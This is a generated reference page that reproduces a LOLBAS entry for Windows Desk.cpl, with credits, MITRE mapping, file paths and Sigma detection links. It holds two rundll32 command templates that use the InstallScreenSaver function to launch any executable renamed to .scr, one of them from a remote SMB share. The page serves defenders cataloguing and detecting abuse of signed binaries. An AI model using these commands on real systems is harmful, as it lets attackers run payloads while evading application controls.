---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Desk.cpl

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `desk.cpl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Desk.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Desk.cpl](../../tools/windows/desk.cpl.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | desk.cpl |
| name | Desk.cpl |
| type | tool |
| source | lolbas |
| url | https://jstnk9.github.io/jstnk9/research/InstallScreenSaver-SCR-files |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@pegabizu'
  Person: Rafael S Marques
- Handle: '@pabraeken'
  Person: Pierre-Alexandre Braeken
- Handle: '@VakninHai'
  Person: hai
- Handle: '@SecurePeacock'
  Person: Christopher Peacock
- Handle: '@Joseliyo_Jstnk'
  Person: Jose Luis Sanchez
Author: Hai Vaknin
Commands:
- Category: Execute
  Command: rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
  Description: Launch an executable with a .scr extension by calling the InstallScreenSaver function.
  MitreID: T1218.011
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Launch any executable payload, as long as it uses the .scr extension.
- Category: Execute
  Command: rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}
  Description: Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver
    function.
  MitreID: T1218.011
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: EXE
  - Execute: Remote
  Usecase: Launch any executable payload, as long as it uses the .scr extension.
Created: 2022-04-21
Description: Desktop Settings Control Panel
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_new_src_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_scr_file_executed_by_rundll32.yml
Full_Path:
- Path: C:\Windows\System32\desk.cpl
- Path: C:\Windows\SysWOW64\desk.cpl
Name: Desk.cpl
Resources:
- Link: https://vxug.fakedoma.in/zines/29a/29a7/Articles/29A-7.030.txt
- Link: https://twitter.com/pabraeken/status/998627081360695297
- Link: https://twitter.com/VakninHai/status/1517027824984547329
- Link: https://jstnk9.github.io/jstnk9/research/InstallScreenSaver-SCR-files
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Desk.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_new_src_file.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_scr_file_executed_by_rundll32.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_new_src_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_scr_file_executed_by_rundll32.yml
```
